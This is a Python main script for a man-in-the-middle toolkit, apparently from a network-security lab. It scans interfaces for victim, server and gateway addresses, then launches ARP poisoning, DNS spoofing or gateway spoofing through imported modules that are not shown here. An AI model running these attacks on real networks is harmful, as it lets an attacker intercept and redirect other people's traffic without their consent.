import config
import arp_poison
import dns_spoof
import arp_mitm_gateway
#import ssl_strip
import recon
import os
import sys


def main():

    interfaces = recon.list_interfaces()

    interfaceLAN = interfaces[1]
    interfaceNAT = interfaces[2]

    
    ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
    macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']

    ipAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['ipAttacker']
    macAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['macAttacker']

    ipGateway = recon.get_gateway()['ipGateway']
    macGateway = recon.get_gateway()['macGateway']

    devicesListNAT = recon.scan_network(interfaceNAT)
    ipVictimNAT = devicesListNAT[3]['ip']
    macVictimNAT = devicesListNAT[3]['mac']


    devicesListLAN = recon.scan_network(interfaceLAN)
    ipVictimLAN = devicesListLAN[0]['ip']
    macVictimLAN = devicesListLAN[0]['mac']
    ipServerLAN = devicesListLAN[1]['ip']
    macServerLAN = devicesListLAN[1]['mac']


    # print(recon.scan_network(interfaceNAT))
    print("Target IP LAN(M1): {}".format(ipVictimLAN))
    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))

    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))

    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))


    print("Target IP NAT(M1): {}".format(ipVictimNAT))
    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))

    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))

    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
    print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))


    if len(sys.argv) != 2:
        print("Usage: python main.py [arp|dns|ssl]")
        sys.exit(1)

    if sys.argv[1] == "arp":
        print("ARP Poisoning...")
        arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
    elif sys.argv[1] == "dns":
        print("DNS spoofing...")
        dns_spoof.dns_spoof()
    elif sys.argv[1] == "arp_patient":
        arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
    elif sys.argv[1] == "arp_gateway":
        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
    #elif sys.argv[1] == "ssl":
        #ssl_strip.start_strip(interface)
    else:
        print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
        sys.exit(1)

if __name__ == "__main__":
    main()
